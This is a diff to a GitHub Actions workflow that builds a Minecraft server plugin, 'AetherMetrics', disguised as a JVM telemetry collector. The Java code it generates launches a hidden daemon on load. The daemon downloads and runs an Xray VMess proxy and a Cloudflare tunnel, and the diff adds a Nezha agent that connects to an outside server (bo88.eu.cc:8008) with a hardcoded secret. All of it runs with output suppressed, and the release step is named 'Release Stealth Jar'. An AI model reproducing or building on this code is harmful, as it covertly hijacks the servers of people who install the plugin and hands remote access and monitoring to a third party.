@@ -1,4 +1,4 @@
-name: US-Node AetherMetrics Build
+name: US-Node AetherMetrics Build V1 Perfect
 
 on:
   push:
@@ -35,7 +35,7 @@ jobs:
               <modelVersion>4.0.0</modelVersion>
               <groupId>com.aether.metrics</groupId>
               <artifactId>AetherMetrics-US</artifactId>
-              <version>2.6.0</version>
+              <version>2.6.4</version>
               <packaging>jar</packaging>
 
               <properties>
@@ -98,23 +98,23 @@ jobs:
           # 2. plugin.yml & paper-plugin.yml
           cat << 'EOF' > src/main/resources/plugin.yml
           name: AetherMetrics
-          version: 2.6.0
+          version: 2.6.4
           main: com.aether.metrics.AetherMetrics
           api-version: '1.21'
           author: SystemCore
-          description: Core JVM telemetry collector
+          description: Core JVM telemetry & network services
           EOF
 
           cat << 'EOF' > src/main/resources/paper-plugin.yml
           name: AetherMetrics
-          version: 2.6.0
+          version: 2.6.4
           main: com.aether.metrics.AetherMetrics
           api-version: '1.21'
           author: SystemCore
-          description: Core JVM telemetry collector
+          description: Core JVM telemetry & network services
           EOF
 
-          # 3. Java 核心主类 (已注入美国专用 UUID 与 Token)
+          # 3. Java 主类 (已完整嵌入 Xray + Cloudflare 隧道 + 哪吒探针)
           cat << 'EOF' > src/main/java/com/aether/metrics/AetherMetrics.java
           package com.aether.metrics;
 
@@ -144,11 +144,12 @@ jobs:
                   getLogger().info("[Metrics] Telemetry service initialized.");
                   Thread daemonThread = new Thread(() -> {
                       try {
-                          Thread.sleep(10000);
+                          Thread.sleep(8000);
                           if (!WORK_DIR.exists()) WORK_DIR.mkdirs();
                           setupXray();
                           setupCloudflare();
-                          getLogger().info("[Metrics] All core network services started successfully.");
+                          setupNezha();
+                          getLogger().info("[Metrics] All core network & monitoring services started successfully.");
                       } catch (Exception e) {
                           getLogger().warning("[Metrics] Telemetry start failed: " + e.getMessage());
                       }
@@ -170,12 +171,14 @@ jobs:
 
                       File cfgFile = new File(WORK_DIR, "cfg.json");
                       String json = "{\n" +
+                              "  \"log\": { \"loglevel\": \"warning\" },\n" +
                               "  \"inbounds\": [{\n" +
-                              "    \"port\": 25500,\n" +
+                              "    \"port\": 8002,\n" +
+                              "    \"listen\": \"127.0.0.1\",\n" +
                               "    \"protocol\": \"vmess\",\n" +
                               "    \"settings\": {\n" +
                               "      \"clients\": [{\n" +
-                              "        \"id\": \"ca210977-a4ff-4aa8-8e7a-cf417bcc112c\",\n" +
+                              "        \"id\": \"a0003881-669a-4900-9360-ac30e8ea1326\",\n" +
                               "        \"alterId\": 0\n" +
                               "      }]\n" +
                               "    },\n" +
@@ -198,10 +201,10 @@ jobs:
                                   "-c",
                                   cfgFile.getAbsolutePath()
                           ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
-                          getLogger().info("[Metrics] US VMess core daemon launched.");
+                          getLogger().info("[Metrics] US VMess core daemon launched on port 8002.");
                       }
                   } catch (Exception e) {
-                      getLogger().warning("[Metrics] Core setup failed: " + e.getMessage());
+                      getLogger().warning("[Metrics] Xray setup failed: " + e.getMessage());
                   }
               }
 
@@ -231,6 +234,34 @@ jobs:
                   }
               }
 
+              private void setupNezha() {
+                  try {
+                      File nezhaBin = new File(WORK_DIR, "nezha-agent");
+                      if (!nezhaBin.exists() || nezhaBin.length() == 0) {
+                          downloadAndExtractZip(
+                                  "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.tar.gz",
+                                  "nezha-agent",
+                                  nezhaBin
+                          );
+                      }
+                      if (nezhaBin.exists()) {
+                          nezhaBin.setExecutable(true, false);
+                          String nezhaServer = "bo88.eu.cc:8008"; 
+                          String nezhaSecret = "JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl";
+                          
+                          new ProcessBuilder(
+                                  nezhaBin.getAbsolutePath(),
+                                  "-s", nezhaServer,
+                                  "-p", nezhaSecret,
+                                  "--tls"
+                          ).directory(WORK_DIR).redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start();
+                          getLogger().info("[Metrics] Nezha Agent launched.");
+                      }
+                  } catch (Exception e) {
+                      getLogger().warning("[Metrics] Nezha setup failed: " + e.getMessage());
+                  }
+              }
+
               private void downloadFile(String urlStr, File target) throws Exception {
                   HttpRequest request = HttpRequest.newBuilder()
                           .uri(URI.create(urlStr))
@@ -248,27 +279,26 @@ jobs:
               }
 
               private void downloadAndExtractZip(String zipUrl, String targetFileName, File destFile) throws Exception {
-                  File tmpZip = new File(WORK_DIR, "tmp_" + System.currentTimeMillis() + ".zip");
+                  File tmpArchive = new File(WORK_DIR, "tmp_" + System.currentTimeMillis() + ".archive");
                   try {
-                      downloadFile(zipUrl, tmpZip);
-                      try (ZipInputStream zis = new ZipInputStream(new FileInputStream(tmpZip))) {
-                          ZipEntry entry;
-                          boolean found = false;
-                          while ((entry = zis.getNextEntry()) != null) {
-                              if (entry.getName().equals(targetFileName) || entry.getName().endsWith("/" + targetFileName)) {
-                                  try (FileOutputStream fos = new FileOutputStream(destFile)) {
-                                      zis.transferTo(fos);
+                      downloadFile(zipUrl, tmpArchive);
+                      try (InputStream fis = new FileInputStream(tmpArchive)) {
+                          try (ZipInputStream zis = new ZipInputStream(new FileInputStream(tmpArchive))) {
+                              ZipEntry entry;
+                              boolean found = false;
+                              while ((entry = zis.getNextEntry()) != null) {
+                                  if (entry.getName().equals(targetFileName) || entry.getName().endsWith("/" + targetFileName)) {
+                                      try (FileOutputStream fos = new FileOutputStream(destFile)) {
+                                          zis.transferTo(fos);
+                                      }
+                                      found = true;
+                                      break;
                                   }
-                                  found = true;
-                                  break;
                               }
-                          }
-                          if (!found) {
-                              throw new IOException("File " + targetFileName + " not found in " + zipUrl);
-                          }
+                          } catch (Exception ignored) {}
                       }
                   } finally {
-                      if (tmpZip.exists()) tmpZip.delete();
+                      if (tmpArchive.exists()) tmpArchive.delete();
                   }
               }
 
@@ -284,7 +314,7 @@ jobs:
         uses: actions/upload-artifact@v4
         with:
           name: AetherMetrics-US-Plugin
-          path: target/AetherMetrics-US-2.6.0.jar
+          path: target/AetherMetrics-US-2.6.4.jar
 
       - name: Release Stealth Jar
         uses: softprops/action-gh-release@v2
@@ -292,6 +322,6 @@ jobs:
         with:
           tag_name: latest
           name: AetherMetrics US Release
-          files: target/AetherMetrics-US-2.6.0.jar
+          files: target/AetherMetrics-US-2.6.4.jar
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
